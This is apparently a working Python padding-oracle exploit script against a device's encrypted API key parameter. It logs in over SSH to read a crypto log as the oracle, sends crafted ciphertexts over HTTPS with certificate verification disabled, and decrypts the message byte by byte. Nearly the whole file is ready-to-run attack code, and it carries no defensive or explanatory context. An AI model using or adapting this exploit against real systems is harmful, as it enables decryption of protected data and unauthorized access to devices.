import paramiko
import sys
import requests

pad=lambda n: '\0'*(n+1)+(chr(16-n)*(16-n-1))
block_xor=lambda x,y: ''.join(chr(ord(a)^ord(b)) for a,b in zip(x,y))
byte_xor=lambda x,y,z: x[:y]+chr(ord(x[y])^z)+x[y+1:]
set_pad=lambda x,n: block_xor(pad(n), x)

def formatData(d):
    return ("-AQ==AAAAAAAAAAAAAAAAAAAAAAAAAAA="+(d.encode('base64').replace('\n',''))).encode('base64').replace('\n','')

def makeRequest(ct, host):
    requests.get('https://'+host+"/api?key={}".format(ct), verify=False)

def checkLog(chan):
    chan.send("tail lines 2 mp-log cryptod.log\n")
    data=''
    while data.count('Error: ')!=2:
        try: data+=chan.recv(512)
        except: pass
    # correct padding!
    return "Integrity check failed" in data


def leakBlock(b0, b1, chan, host):
    pt='\0'*16
    for i in range(15,-1, -1):
        for j in range(255,-1,-1):
            a=block_xor(pt, b0)
            b=set_pad(a,i)
            ct=formatData(byte_xor(b, i, j)+b1)
            makeRequest(ct, host)
            if checkLog(chan):
                pt=byte_xor(pt, i, j^(16-i))
                print(pt.encode('hex'))
                break
        else: print("no valid padding found... error")
    return pt


def decrypt(stdout, ct, host):
    if ct[0]=='-': ct=ct[33:]

    # bonus points if you understand this line without google :) 
    blocks=map(''.join, zip(*[iter(ct.decode('base64'))]*16))[::-1]+['\0'*16]

    result=[]
    for i in range(len(blocks)-1):
        result.insert(0, leakBlock(blocks[i+1], blocks[i], stdout, host))
        print("Decrypted block: {}".format(result[-1]))

    return ''.join(result)
    

    

if __name__=="__main__":
    if len(sys.argv)<4:
        print("usage: oracle.py <user> <pass> <host> <etext>")
        exit(1)
    u=sys.argv[1]
    p=sys.argv[2]
    h=sys.argv[3]
    ct=sys.argv[4]

    client=paramiko.client.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(h,22, username=u, password=p)
    chan=client.invoke_shell()
    chan.settimeout(0.1)
    try: chan.recv(1024)
    except: pass
    print("decrypted message: ")
    print(decrypt(chan, ct, h).encode('hex'))
